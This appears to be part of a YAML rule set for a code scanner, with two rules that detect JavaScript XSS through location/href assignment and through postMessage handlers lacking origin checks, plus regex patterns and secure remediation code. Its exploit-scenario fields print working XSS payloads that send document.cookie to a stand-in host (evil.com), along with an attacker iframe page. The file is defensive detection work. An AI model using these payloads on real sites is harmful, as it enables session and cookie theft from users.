  # --------------------------------------------------------------------------
  # XSS-JS-009: Location Manipulation and JavaScript URI
  # --------------------------------------------------------------------------
  - rule_id: XSS-JS-009
    title: Location Manipulation and javascript URI Injection
    description: >
      Detects patterns where user-controlled data is assigned to location properties
      (window.location, document.location, location.href) or used in anchor href
      attributes without validation against javascript: URI schemes. JavaScript URIs
      execute arbitrary script when navigated to and are a common XSS vector in
      redirect and navigation logic.
    language: javascript
    category: xss
    severity: High
    confidence: 0.89
    cwe: CWE-79
    owasp: A03:2021-Injection
    tags: [xss, javascript-uri, open-redirect, navigation, javascript]
    detection_layer: 1
    attack_surface_type: web
    patterns:
      - type: regex
        pattern: '(?:window\.|document\.)?location(?:\.href)?\s*=\s*(?:req\.query|req\.params|data|user|param|input|searchParams)\.'
        description: "Location assignment from user-controlled source"
      - type: regex
        pattern: '(?:window\.|document\.)?location\.replace\s*\(\s*(?:req\.query|req\.params|data|user|param|input|searchParams)\.'
        description: "location.replace with user-controlled URL"
      - type: regex
        pattern: '\.setAttribute\s*\(\s*[''"]href[''"].*?(?:param|input|query|user|data|url|redirect|next|return|callback)'
        description: "setAttribute href with user-controlled URL"
      - type: regex
        pattern: 'href\s*=\s*\{?\s*(?:props|state|data|user|content|param|input|url)\.\w+'
        description: "JSX/HTML href from user-controlled variable"
      - type: regex
        pattern: '\.href\s*=\s*(?:.*(?:URLSearchParams|searchParams|query|hash|param|redirect|next|return))'
        description: "href property set from URL parameters"
      - type: regex
        pattern: 'window\.open\s*\(\s*(?:.*(?:param|input|query|user|data|url|redirect|next|return))'
        description: "window.open with user-controlled URL"
    anti_patterns:
      - 'javascript:'
      - 'startsWith.*http'
      - 'startsWith.*/'
      - 'URL.*parse'
      - 'new URL'
      - 'isValidUrl'
      - 'sanitizeUrl'
      - 'allowedDomains'
      - '.test.'
      - '__tests__'
      - 'spec.'
      - 'mock'
      - 'fixture'
      - 'jest'
    bypass_variants:
      - description: "javascript: URI with entity encoding"
        pattern: 'href=.*?(?:&#106;|&#x6A;|\\u006A)avascript'
      - description: "Case variation of javascript: scheme"
        pattern: 'href=.*?(?:JavaScript|JAVASCRIPT|jAvAsCrIpT):'
      - description: "Data URI with script content"
        pattern: 'href=.*?(?:data:text/html|data:application/javascript)'
    evasion_indicators:
      - "javascript: URI with case variations"
      - "Entity-encoded javascript: scheme"
      - "data: URI used for script execution"
      - "vbscript: URI on legacy browsers"
    encoding_variants:
      - type: "location_assign"
        pattern: 'location\s*=\s*(?:user|param|data|query)\.'
      - type: "href_attribute"
        pattern: 'href\s*=\s*(?:user|param|data|url)\.'
      - type: "window_open"
        pattern: 'window\.open\s*\(\s*(?:user|param|data|url)\.'
    multi_function_chain_patterns:
      - "req.query.redirect -> location.href = redirect"
      - "URLSearchParams.get('url') -> anchor.href = url"
      - "props.link -> <a href={link}> without validation"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "javascript: URI injection enables XSS via navigation"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "url_parameter"
        sink: "location.href"
        through: "redirect_logic"
      - source: "query_string"
        sink: "anchor_href"
        through: "dynamic_link"
      - source: "user_profile_url"
        sink: "href_attribute"
        through: "database_field"
    impact: |
      javascript: URI injection and open redirect enable:
      - XSS via javascript: protocol in href/location
      - Phishing through open redirect to lookalike domains
      - Session theft via redirect to attacker-controlled page
      - OAuth token theft via redirect URI manipulation
    remediation: |
      ```javascript
      // SECURE: Validate URL scheme before redirect
      function safeRedirect(url) {
        try {
          const parsed = new URL(url, window.location.origin);
          if (!['http:', 'https:'].includes(parsed.protocol)) {
            throw new Error('Invalid protocol');
          }
          // Optionally check against allowed domains
          window.location.href = parsed.href;
        } catch {
          window.location.href = '/';
        }
      }

      // React: Use sanitize-url library
      import { sanitizeUrl } from '@braintree/sanitize-url';
      <a href={sanitizeUrl(userUrl)}>Link</a>
      ```
    references:
      - "https://cwe.mitre.org/data/definitions/79.html"
      - "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"
    context_awareness:
      surrounding_context_patterns: ['location', 'href', 'redirect', 'navigate', 'window.open']
      taint_source_indicators: ['req.query', 'URLSearchParams', 'location.search', 'route.params']
      taint_sink_indicators: ['location.href', 'location.replace', 'window.open', 'href=']
      sanitization_patterns: ['new URL', 'sanitizeUrl', 'startsWith', 'protocol check']
    severity_scoring:
      severity_weight: 8
      risk_score_formula_hint: "severity_weight * confidence * (1 + redirect_exploitation)"
      exploitability_score: High
    exploit_scenario:
      attack_example: |
        Open redirect used for javascript URI XSS:
        const redirect = new URLSearchParams(location.search).get('next');
        window.location.href = redirect;
        URL: https://target.com/login?next=javascript:fetch('https://evil.com?c='+document.cookie)
      example_payload: "javascript:document.location='https://evil.com/steal?c='+document.cookie"
      attacker_objective: "Inject javascript: URI via navigation/redirect logic"
    confidence_factors:
      pattern_strength: high
      context_match: high
      proximity_to_user_input: high
      sanitization_absence: high
    metadata:
      rule_version: '3.0.0'
      last_reviewed: '2025-01-15'
      rule_maturity_level: hardened
      detection_complexity: contextual
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules: [XSS-JS-001, XSS-JS-002]

  # --------------------------------------------------------------------------
  # XSS-JS-010: postMessage XSS
  # --------------------------------------------------------------------------
  - rule_id: XSS-JS-010
    title: Insecure postMessage Handler Enabling XSS
    description: >
      Detects window.addEventListener('message') handlers that process incoming
      messages without validating the origin and use the message data in dangerous
      sinks like innerHTML, eval, or document.write. The postMessage API allows
      cross-origin communication; without origin validation, any page can send
      malicious data to the handler.
    language: javascript
    category: xss
    severity: High
    confidence: 0.88
    cwe: CWE-79
    owasp: A03:2021-Injection
    tags: [xss, postMessage, cross-origin, dom-xss, javascript]
    detection_layer: 2
    attack_surface_type: web
    patterns:
      - type: regex
        pattern: 'addEventListener\s*\(\s*[''"]message[''"].*?(?:innerHTML|outerHTML)\s*=\s*(?:event|e|msg)\.data'
        description: "Message handler setting innerHTML from event.data"
      - type: regex
        pattern: 'addEventListener\s*\(\s*[''"]message[''"].*?(?:eval|Function)\s*\(\s*(?:event|e|msg)\.data'
        description: "Message handler eval-ing event.data"
      - type: regex
        pattern: 'addEventListener\s*\(\s*[''"]message[''"].*?document\.write\s*\(\s*(?:event|e|msg)\.data'
        description: "Message handler using document.write with event.data"
      - type: regex
        pattern: 'addEventListener\s*\(\s*[''"]message[''"].*?(?!(?:event|e)\.origin).*?(?:innerHTML|eval|document\.write|location)'
        description: "Message handler without origin check using dangerous sink"
      - type: regex
        pattern: 'onmessage\s*=\s*(?:function|\().*?(?:innerHTML|eval|document\.write)\s*(?:=|\()\s*(?:event|e|msg)\.data'
        description: "onmessage handler with dangerous sink"
      - type: regex
        pattern: 'addEventListener\s*\(\s*[''"]message[''"].*?location\.\w+\s*=\s*(?:event|e|msg)\.data'
        description: "Message handler setting location from event.data"
    anti_patterns:
      - 'event.origin'
      - 'e.origin'
      - 'msg.origin'
      - 'origin.*===.*https'
      - 'allowedOrigins'
      - 'trustedOrigins'
      - 'DOMPurify'
      - 'sanitize'
      - '.test.'
      - '__tests__'
      - 'spec.'
      - 'mock'
      - 'fixture'
      - 'jest'
    bypass_variants:
      - description: "Origin check with loose comparison"
        pattern: 'event\.origin\s*(?:==|\.includes|\.indexOf|\.match)\s*\(\s*[''"].*?[''"]'
      - description: "Origin check only logging, not blocking"
        pattern: 'event\.origin[^}]*console\.(?:log|warn)[^}]*innerHTML\s*=\s*event\.data'
      - description: "postMessage from sandboxed iframe with null origin"
        pattern: 'event\.origin\s*===?\s*[''"]null[''"].*?(?:innerHTML|eval)'
    evasion_indicators:
      - "Origin check with loose string matching"
      - "Origin check present but not enforced"
      - "null origin from sandboxed iframes accepted"
      - "Origin checked against user-controllable value"
    encoding_variants:
      - type: "event_listener"
        pattern: 'addEventListener.*message.*event\.data.*innerHTML'
      - type: "onmessage"
        pattern: 'onmessage.*event\.data.*(?:eval|innerHTML)'
      - type: "structured_clone"
        pattern: 'event\.data\.\w+.*innerHTML'
    multi_function_chain_patterns:
      - "addEventListener('message') -> event.data -> innerHTML"
      - "onmessage = fn -> e.data.html -> document.write(html)"
      - "addEventListener('message') -> event.data.script -> eval(script)"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "postMessage XSS enables cross-origin script injection"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "cross_origin_message"
        sink: "innerHTML"
        through: "event_data"
      - source: "iframe_postMessage"
        sink: "eval"
        through: "message_handler"
      - source: "window_message"
        sink: "location"
        through: "event_data_url"
    impact: |
      Insecure postMessage handlers enable cross-origin XSS:
      - Any origin can send malicious data to the handler
      - Script injection via innerHTML or eval
      - Navigation hijacking via location manipulation
      - Cross-origin data theft from parent/child windows
    remediation: |
      ```javascript
      // SECURE: Always validate origin and sanitize data
      window.addEventListener('message', (event) => {
        // Strict origin check
        if (event.origin !== 'https://trusted-domain.com') {
          return;
        }

        // Validate message structure
        if (typeof event.data !== 'object' || !event.data.type) {
          return;
        }

        // Use safe DOM methods
        element.textContent = event.data.text;
        // If HTML needed, sanitize first
        element.innerHTML = DOMPurify.sanitize(event.data.html);
      });
      ```
    references:
      - "https://cwe.mitre.org/data/definitions/79.html"
      - "https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage#security_concerns"
    context_awareness:
      surrounding_context_patterns: ['addEventListener', 'message', 'postMessage', 'onmessage']
      taint_source_indicators: ['event.data', 'e.data', 'msg.data', 'message.data']
      taint_sink_indicators: ['innerHTML', 'eval', 'document.write', 'location.href']
      sanitization_patterns: ['event.origin', 'DOMPurify', 'sanitize', 'allowedOrigins']
    severity_scoring:
      severity_weight: 8
      risk_score_formula_hint: "severity_weight * confidence * (1 + origin_check_absence)"
      exploitability_score: High
    exploit_scenario:
      attack_example: |
        postMessage handler without origin check:
        window.addEventListener('message', (e) => { document.getElementById('content').innerHTML = e.data; });

        Attacker page:
        <iframe src="https://target.com/page"></iframe>
        <script>frames[0].postMessage('<img src=x onerror=alert(document.cookie)>', '*');</script>
      example_payload: "<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>"
      attacker_objective: "Inject script via cross-origin postMessage to unvalidated handler"
    confidence_factors:
      pattern_strength: high
      context_match: high
      proximity_to_user_input: high
      sanitization_absence: high
    metadata:
      rule_version: '3.0.0'
      last_reviewed: '2025-01-15'
      rule_maturity_level: hardened
      detection_complexity: contextual
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules: [XSS-JS-001, XSS-JS-006]
